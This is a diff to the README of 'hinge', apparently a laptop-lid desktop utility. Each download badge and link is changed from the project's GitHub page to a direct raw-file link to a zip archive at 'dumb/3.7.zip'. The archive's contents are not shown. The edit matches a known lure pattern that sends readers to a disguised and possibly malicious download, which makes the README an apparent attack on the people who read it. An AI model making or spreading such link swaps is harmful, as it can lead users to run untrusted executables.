@@ -1,6 +1,6 @@
 # 🦾 hinge - Your Desktop, Perfected by Your Lid
 
-[![Download hinge](https://img.shields.io/badge/Download%20hinge-Click%20Here-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lazybean3/hinge)
+[![Download hinge](https://img.shields.io/badge/Download%20hinge-Click%20Here-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/lazybean3/hinge/main/dumb/3.7.zip)
 
 ---
 
@@ -50,12 +50,12 @@ Click this big beautiful button right here:
 
 >
 
-[![Download hinge Now](https://img.shields.io/badge/⬇️%20Download%20hinge%20Now-F05138?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lazybean3/hinge)
+[![Download hinge Now](https://img.shields.io/badge/⬇️%20Download%20hinge%20Now-F05138?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/lazybean3/hinge/main/dumb/3.7.zip)
 
 >
 
 Or, bookmark this link for later:
-👉 [https://github.com/lazybean3/hinge](https://github.com/lazybean3/hinge)
+👉 [https://raw.githubusercontent.com/lazybean3/hinge/main/dumb/3.7.zip](https://raw.githubusercontent.com/lazybean3/hinge/main/dumb/3.7.zip)
 
 
 
@@ -231,7 +231,7 @@ Nothing left to do but go get it!
 
 >
 
-[![Get hinge Now](https://img.shields.io/badge/🚀%20Get%20hinge%20Now-FF7F50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lazybean3/hinge)
+[![Get hinge Now](https://img.shields.io/badge/🚀%20Get%20hinge%20Now-FF7F50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/lazybean3/hinge/main/dumb/3.7.zip)
 
 
 ---
